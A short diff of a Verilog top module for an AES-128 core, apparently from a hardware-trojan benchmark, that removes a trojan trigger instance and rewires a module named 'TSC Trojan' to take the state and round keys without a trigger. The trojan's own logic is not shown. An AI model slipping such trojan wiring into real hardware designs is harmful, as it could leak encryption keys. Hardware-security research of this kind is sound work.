@@ -30,7 +30,6 @@ module top(
 	wire Tj_Trig;
 	
 	aes_128 AES  (clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8); 
-	Trojan_Trigger Trigger (rst, state, Tj_Trig);
-	TSC Trojan (rst, clk, Tj_Trig, state, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
+	TSC Trojan (rst, clk, state, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
 
 endmodule
